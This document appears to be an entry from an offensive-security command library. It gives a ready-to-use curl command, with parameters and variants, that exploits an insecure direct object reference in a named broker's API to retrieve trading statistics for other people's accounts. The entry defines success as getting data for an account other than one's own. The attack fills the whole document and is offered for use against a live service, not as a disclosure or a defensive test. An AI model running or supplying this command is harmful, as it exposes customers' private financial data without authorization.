---
id: cmd-orders-stats-001
data: >-
  curl -X GET
  "https://api.exness.com/v3/personal_area/stats/orders_number?time_range=365&accounts={accountNumber}"
  -H "Authorization: Bearer {token}" -H "Content-Type: application/json"
tags:
  - idor
  - api
  - exness
type: command
output: JSON response with order count statistics
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:39.145Z'
verified: false
validated: true
submitted: true
---
# query-exness-orders-stats

## Command

```bash
curl -X GET "https://api.exness.com/v3/personal_area/stats/orders_number?time_range=365&accounts={accountNumber}" -H "Authorization: Bearer {token}" -H "Content-Type: application/json"
```

## Description

Retrieves the number of closed orders for a target MT account, exploitable via IDOR.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| accounts | Target account ID | Yes |
| time_range | Time period in days | Yes |
| Authorization | Bearer token | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://api.exness.com/v3/personal_area/stats/orders_number?time_range=365&accounts=xxx" -H "Authorization: Bearer eyJ..."
```

### Advanced Usage

```bash
curl -X GET "https://api.exness.com/v3/personal_area/stats/orders_number?time_range=365&accounts=xxx" -H "Authorization: Bearer {token}" -o orders.json
```

## Expected Output

JSON with order counts, e.g., {"data": [{"date": "2023-01-01", "orders": 10}]}. Success if data retrieved for other account.

## Related

- [[commands/query-exness-volume-stats]]
- [[procedures/Exploit-IDOR-in-Exness-Stats-API]]
